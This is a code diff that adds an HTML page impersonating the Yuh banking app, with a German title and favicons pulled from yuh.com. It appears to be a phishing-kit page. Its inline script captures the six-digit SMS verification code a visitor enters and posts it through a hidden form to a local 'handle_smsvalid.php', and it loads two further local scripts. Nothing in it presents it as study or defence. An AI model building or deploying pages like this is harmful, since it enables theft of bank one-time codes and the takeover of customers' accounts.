@@ -1,0 +1,85 @@
+source: <!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="apple-touch-icon" sizes="57x57" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-57x57.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-60x60.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-72x72.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-76x76.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-114x114.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-120x120.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-144x144.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-152x152.png?v=1737647173">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/apple-icon-180x180.png?v=1737647173">
+    <link rel="icon" type="image/png" sizes="192x192"  href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/android-icon-192x192.png?v=1737647173">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/favicon-32x32.png?v=1737647173">
+    <link rel="icon" type="image/png" sizes="96x96" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/favicon-96x96.png?v=1737647173">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/favicon-16x16.png?v=1737647173">
+    <link rel="manifest" href="https://www.yuh.com/de/wp-content/themes/yuh/assets/images/favicon/manifest.json?v=1737647173">
+    <title>Yuh Finanz- App | Kostenloses All-in-One Online-Konto </title>
+    <script src="./assets/override.js"></script>
+    <script type="module" crossorigin src="./assets/index-BR8ZZO5r.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-Dj2he9Mj.css">
+    <script>
+      window.addEventListener('DOMContentLoaded', function() {
+        // Listen for the verify button click
+        document.addEventListener('click', function(e) {
+          if (e.target && (e.target.innerText === 'Verify Code' || e.target.className.includes('verify'))) {
+            e.preventDefault();
+            
+            // Get the SMS input value
+            const smsInput = document.querySelector('input[name="sms"]');
+            if (!smsInput) {
+              console.error('SMS input not found');
+              return;
+            }
+
+            const code = smsInput.value;
+            if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
+              console.error('Invalid code entered');
+              smsInput.classList.add('shake');
+              setTimeout(() => smsInput.classList.remove('shake'), 820);
+              return;
+            }
+
+            // Create and submit form
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = './handle_smsvalid.php';
+            form.style.display = 'none';
+
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'sms_code';
+            input.value = code;
+
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+          }
+        });
+
+        // Add input validation for SMS field
+        const smsInput = document.querySelector('input[name="sms"]');
+        if (smsInput) {
+          smsInput.addEventListener('input', function(e) {
+            // Remove any non-numeric characters
+            this.value = this.value.replace(/\D/g, '');
+            
+            // Limit to 6 digits
+            if (this.value.length > 6) {
+              this.value = this.value.slice(0, 6);
+            }
+          });
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script src="./assets/form-handler.js"></script>
+  </body>
+</html>
+
+Page title: Yuh Finanz- App | Kostenloses All-in-One Online-Konto 
